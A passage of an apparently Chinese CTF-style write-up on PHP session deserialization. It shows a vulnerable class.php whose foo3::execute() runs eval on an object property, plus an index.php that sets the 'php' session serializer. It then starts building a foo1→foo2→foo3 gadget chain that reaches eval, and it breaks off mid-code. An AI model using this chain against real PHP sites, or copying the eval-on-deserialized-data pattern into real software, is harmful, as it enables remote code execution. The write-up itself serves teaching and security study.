+                        <div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-58150e20dfc1c816433959-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc1c816433959-2">2</div><div class="crayon-num" data-line="crayon-58150e20dfc1c816433959-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc1c816433959-4">4</div><div class="crayon-num" data-line="crayon-58150e20dfc1c816433959-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc1c816433959-6">6</div><div class="crayon-num" data-line="crayon-58150e20dfc1c816433959-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc1c816433959-8">8</div><div class="crayon-num" data-line="crayon-58150e20dfc1c816433959-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc1c816433959-10">10</div><div class="crayon-num" data-line="crayon-58150e20dfc1c816433959-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc1c816433959-12">12</div><div class="crayon-num" data-line="crayon-58150e20dfc1c816433959-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc1c816433959-14">14</div><div class="crayon-num" data-line="crayon-58150e20dfc1c816433959-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc1c816433959-16">16</div><div class="crayon-num" data-line="crayon-58150e20dfc1c816433959-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc1c816433959-18">18</div><div class="crayon-num" data-line="crayon-58150e20dfc1c816433959-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc1c816433959-20">20</div><div class="crayon-num" data-line="crayon-58150e20dfc1c816433959-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc1c816433959-22">22</div><div class="crayon-num" data-line="crayon-58150e20dfc1c816433959-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc1c816433959-24">24</div><div class="crayon-num" data-line="crayon-58150e20dfc1c816433959-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc1c816433959-26">26</div><div class="crayon-num" data-line="crayon-58150e20dfc1c816433959-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc1c816433959-28">28</div><div class="crayon-num" data-line="crayon-58150e20dfc1c816433959-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc1c816433959-30">30</div><div class="crayon-num" data-line="crayon-58150e20dfc1c816433959-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc1c816433959-32">32</div><div class="crayon-num" data-line="crayon-58150e20dfc1c816433959-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc1c816433959-34">34</div><div class="crayon-num" data-line="crayon-58150e20dfc1c816433959-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc1c816433959-36">36</div><div class="crayon-num" data-line="crayon-58150e20dfc1c816433959-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc1c816433959-38">38</div><div class="crayon-num" data-line="crayon-58150e20dfc1c816433959-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc1c816433959-40">40</div><div class="crayon-num" data-line="crayon-58150e20dfc1c816433959-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc1c816433959-42">42</div><div class="crayon-num" data-line="crayon-58150e20dfc1c816433959-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc1c816433959-44">44</div><div class="crayon-num" data-line="crayon-58150e20dfc1c816433959-45">45</div></div>
+                    </td>
+                    <td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-58150e20dfc1c816433959-1"><span class="crayon-ta">&lt;?php</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc1c816433959-2">&nbsp;</div><div class="crayon-line" id="crayon-58150e20dfc1c816433959-3"><span class="crayon-e">highlight_string</span><span class="crayon-sy">(</span><span class="crayon-e">file_get_contents</span><span class="crayon-sy">(</span><span class="crayon-e">basename</span><span class="crayon-sy">(</span><span class="crayon-v">$_SERVER</span><span class="crayon-sy">[</span><span class="crayon-s">'PHP_SELF'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc1c816433959-4"><span class="crayon-c">//show_source(__FILE__);</span></div><div class="crayon-line" id="crayon-58150e20dfc1c816433959-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc1c816433959-6"><span class="crayon-t">class</span><span class="crayon-h"> </span><span class="crayon-e">foo1</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-58150e20dfc1c816433959-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-v">$varr</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc1c816433959-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">__construct</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-58150e20dfc1c816433959-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$this</span><span class="crayon-o">-&gt;</span><span class="crayon-i">varr</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"index.php"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc1c816433959-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-58150e20dfc1c816433959-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">__destruct</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc1c816433959-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-e">file_exists</span><span class="crayon-sy">(</span><span class="crayon-v">$this</span><span class="crayon-o">-&gt;</span><span class="crayon-i">varr</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-58150e20dfc1c816433959-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">echo</span><span class="crayon-h"> </span><span class="crayon-s">"&lt;br&gt;文件"</span><span class="crayon-sy">.</span><span class="crayon-v">$this</span><span class="crayon-o">-&gt;</span><span class="crayon-i">varr</span><span class="crayon-sy">.</span><span class="crayon-s">"存在&lt;br&gt;"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc1c816433959-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-58150e20dfc1c816433959-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">echo</span><span class="crayon-h"> </span><span class="crayon-s">"&lt;br&gt;这是foo1的析构函数&lt;br&gt;"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc1c816433959-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-58150e20dfc1c816433959-17"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc1c816433959-18">&nbsp;</div><div class="crayon-line" id="crayon-58150e20dfc1c816433959-19"><span class="crayon-t">class</span><span class="crayon-h"> </span><span class="crayon-e">foo2</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc1c816433959-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-v">$varr</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-58150e20dfc1c816433959-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-v">$obj</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc1c816433959-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">__construct</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-58150e20dfc1c816433959-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$this</span><span class="crayon-o">-&gt;</span><span class="crayon-i">varr</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'1234567890'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc1c816433959-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$this</span><span class="crayon-o">-&gt;</span><span class="crayon-i">obj</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">null</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-58150e20dfc1c816433959-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc1c816433959-26"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">__toString</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-58150e20dfc1c816433959-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$this</span><span class="crayon-o">-&gt;</span><span class="crayon-i">obj</span><span class="crayon-o">-&gt;</span><span class="crayon-e">execute</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc1c816433959-28"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">return</span><span class="crayon-h"> </span><span class="crayon-v">$this</span><span class="crayon-o">-&gt;</span><span class="crayon-i">varr</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-58150e20dfc1c816433959-29"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc1c816433959-30"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">__desctuct</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-58150e20dfc1c816433959-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">echo</span><span class="crayon-h"> </span><span class="crayon-s">"&lt;br&gt;这是foo2的析构函数&lt;br&gt;"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc1c816433959-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-58150e20dfc1c816433959-33"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc1c816433959-34">&nbsp;</div><div class="crayon-line" id="crayon-58150e20dfc1c816433959-35"><span class="crayon-t">class</span><span class="crayon-h"> </span><span class="crayon-e">foo3</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc1c816433959-36"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-v">$varr</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-58150e20dfc1c816433959-37"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">execute</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc1c816433959-38"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">eval</span><span class="crayon-sy">(</span><span class="crayon-v">$this</span><span class="crayon-o">-&gt;</span><span class="crayon-i">varr</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-58150e20dfc1c816433959-39"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc1c816433959-40"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">__desctuct</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-58150e20dfc1c816433959-41"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">echo</span><span class="crayon-h"> </span><span class="crayon-s">"&lt;br&gt;这是foo3的析构函数&lt;br&gt;"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc1c816433959-42"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-58150e20dfc1c816433959-43"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc1c816433959-44">&nbsp;</div><div class="crayon-line" id="crayon-58150e20dfc1c816433959-45"><span class="crayon-ta">?&gt;</span></div></div></td>
+                </tr>
+            </table>
+        </div>
+    </div>
+    <!-- [Format Time: 0.0055 seconds] -->
+    <p>index.php</p>
+    <p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->
+
+    <div id="crayon-58150e20dfc1f250589074" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
+
+        <div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;"><span class="crayon-title"></span>
+            <div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;"><span class="crayon-mixed-highlight" title="含多种语言"></span><div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div></div></div>
+        <div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
+        <div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
+&lt;?php
+
+ini_set('session.serialize_handler', 'php');
+
+require("./class.php");
+
+session_start();
+
+$obj = new foo1();
+
+$obj-&gt;varr = "phpinfo.php";
+
+?&gt;</textarea></div>
+        <div class="crayon-main" style="">
+            <table class="crayon-table">
+                <tr class="crayon-row">
+                    <td class="crayon-nums " data-settings="show">
+                        <div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-58150e20dfc1f250589074-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc1f250589074-2">2</div><div class="crayon-num" data-line="crayon-58150e20dfc1f250589074-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc1f250589074-4">4</div><div class="crayon-num" data-line="crayon-58150e20dfc1f250589074-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc1f250589074-6">6</div><div class="crayon-num" data-line="crayon-58150e20dfc1f250589074-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc1f250589074-8">8</div><div class="crayon-num" data-line="crayon-58150e20dfc1f250589074-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc1f250589074-10">10</div><div class="crayon-num" data-line="crayon-58150e20dfc1f250589074-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc1f250589074-12">12</div><div class="crayon-num" data-line="crayon-58150e20dfc1f250589074-13">13</div></div>
+                    </td>
+                    <td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-58150e20dfc1f250589074-1"><span class="crayon-ta">&lt;?php</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc1f250589074-2">&nbsp;</div><div class="crayon-line" id="crayon-58150e20dfc1f250589074-3"><span class="crayon-e">ini_set</span><span class="crayon-sy">(</span><span class="crayon-s">'session.serialize_handler'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'php'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc1f250589074-4">&nbsp;</div><div class="crayon-line" id="crayon-58150e20dfc1f250589074-5"><span class="crayon-k ">require</span><span class="crayon-sy">(</span><span class="crayon-s">"./class.php"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc1f250589074-6">&nbsp;</div><div class="crayon-line" id="crayon-58150e20dfc1f250589074-7"><span class="crayon-e">session_start</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc1f250589074-8">&nbsp;</div><div class="crayon-line" id="crayon-58150e20dfc1f250589074-9"><span class="crayon-v">$obj</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">foo1</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc1f250589074-10">&nbsp;</div><div class="crayon-line" id="crayon-58150e20dfc1f250589074-11"><span class="crayon-v">$obj</span><span class="crayon-o">-&gt;</span><span class="crayon-i">varr</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"phpinfo.php"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc1f250589074-12">&nbsp;</div><div class="crayon-line" id="crayon-58150e20dfc1f250589074-13"><span class="crayon-ta">?&gt;</span></div></div></td>
+                </tr>
+            </table>
+        </div>
+    </div>
+    <!-- [Format Time: 0.0014 seconds] -->
+    <p>通过代码发现，我们最终是要通过foo3中的execute来执行我们自定义的函数。<br />
+        那么我们首先在本地搭建环境，构造我们需要执行的自定义的函数。如下：<br />
+        myindex.php</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->
+
+    <div id="crayon-58150e20dfc22017402856" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
+
+        <div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;"><span class="crayon-title"></span>
+            <div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;"><span class="crayon-mixed-highlight" title="含多种语言"></span><div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div></div></div>
+        <div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
+        <div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
+&lt;?php
+class foo3{
+        public $varr='echo "spoock";';
+        function execute(){
+                eval($this-&gt;varr);
+        }
+}
+class foo2{
+        public $varr;
+        public $obj;
+        function __construct(){
+                $this-&gt;varr = '1234567890';
+                $this-&gt;obj = new foo3();
+        }
+        function __toString(){
+                $this-&gt;obj-&gt;execute();
+                return $this-&gt;varr;
+        }
+}
+
+class foo1{
+        public $varr;
+        function __construct(){
+                $this-&gt;varr = new foo2();
+        }
+}
+
+
+$obj = new foo1();
+print_r(serialize($obj));
+?&gt;</textarea></div>
+        <div class="crayon-main" style="">
+            <table class="crayon-table">
+                <tr class="crayon-row">
+                    <td class="crayon-nums " data-settings="show">
+                        <div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-58150e20dfc22017402856-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc22017402856-2">2</div><div class="crayon-num" data-line="crayon-58150e20dfc22017402856-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc22017402856-4">4</div><div class="crayon-num" data-line="crayon-58150e20dfc22017402856-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc22017402856-6">6</div><div class="crayon-num" data-line="crayon-58150e20dfc22017402856-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc22017402856-8">8</div><div class="crayon-num" data-line="crayon-58150e20dfc22017402856-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc22017402856-10">10</div><div class="crayon-num" data-line="crayon-58150e20dfc22017402856-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc22017402856-12">12</div><div class="crayon-num" data-line="crayon-58150e20dfc22017402856-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc22017402856-14">14</div><div class="crayon-num" data-line="crayon-58150e20dfc22017402856-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc22017402856-16">16</div><div class="crayon-num" data-line="crayon-58150e20dfc22017402856-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc22017402856-18">18</div><div class="crayon-num" data-line="crayon-58150e20dfc22017402856-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc22017402856-20">20</div><div class="crayon-num" data-line="crayon-58150e20dfc22017402856-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc22017402856-22">22</div><div class="crayon-num" data-line="crayon-58150e20dfc22017402856-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc22017402856-24">24</div><div class="crayon-num" data-line="crayon-58150e20dfc22017402856-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc22017402856-26">26</div><div class="crayon-num" data-line="crayon-58150e20dfc22017402856-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc22017402856-28">28</div><div class="crayon-num" data-line="crayon-58150e20dfc22017402856-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc22017402856-30">30</div><div class="crayon-num" data-line="crayon-58150e20dfc22017402856-31">31</div></div>
+                    </td>
+                    <td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-58150e20dfc22017402856-1"><span class="crayon-ta">&lt;?php</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc22017402856-2"><span class="crayon-t">class</span><span class="crayon-h"> </span><span class="crayon-e">foo3</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-58150e20dfc22017402856-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-v">$varr</span><span class="crayon-o">=</span><span class="crayon-s">'echo "spoock";'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc22017402856-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">execute</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-58150e20dfc22017402856-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">eval</span><span class="crayon-sy">(</span><span class="crayon-v">$this</span><span class="crayon-o">-&gt;</span><span class="crayon-i">varr</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc22017402856-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-58150e20dfc22017402856-7"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc22017402856-8"><span class="crayon-t">class</span><span class="crayon-h"> </span><span class="crayon-e">foo2</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-58150e20dfc22017402856-9"><span 